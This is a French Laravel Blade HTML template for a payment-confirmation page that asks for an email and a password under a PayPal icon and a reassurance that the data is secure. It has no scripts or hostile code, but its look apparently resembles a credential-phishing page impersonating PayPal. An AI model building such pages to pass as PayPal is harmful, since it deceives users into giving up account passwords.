<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmation du Paiement</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="bg-white shadow-2xl rounded-lg p-8 w-96 text-center">
        <h2 class="text-2xl font-bold mb-4 text-gray-800">Confirmez votre paiement</h2>
        <p class="text-gray-600 mb-6">Veuillez entrer vos informations pour finaliser le paiement.</p>

        <!-- Formulaire de paiement -->
        <form action="" method="POST" class="text-left">
            @csrf

            <!-- Email -->
            <div class="mb-4">
                <label for="email" class="block text-gray-700 font-medium">Email</label>
                <input type="email" id="email" name="email" required 
                    class="w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-blue-400 focus:outline-none"
                    placeholder="Entrez votre email">
            </div>

            <!-- Mot de passe -->
            <div class="mb-4">
                <label for="password" class="block text-gray-700 font-medium">Mot de passe</label>
                <input type="password" id="password" name="password" required 
                    class="w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-blue-400 focus:outline-none"
                    placeholder="Entrez votre mot de passe">
            </div>

            <!-- Bouton de validation -->
            <button type="submit" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 rounded-lg transition-colors duration-300">
                <i class="fab fa-paypal mr-2"></i>Confirmer le paiement
            </button>
        </form>

        <!-- Message de sécurité -->
        <p class="text-sm text-gray-500 mt-6">
            <i class="fas fa-lock mr-1"></i> Vos informations sont sécurisées.
        </p>
    </div>
</body>
</html>
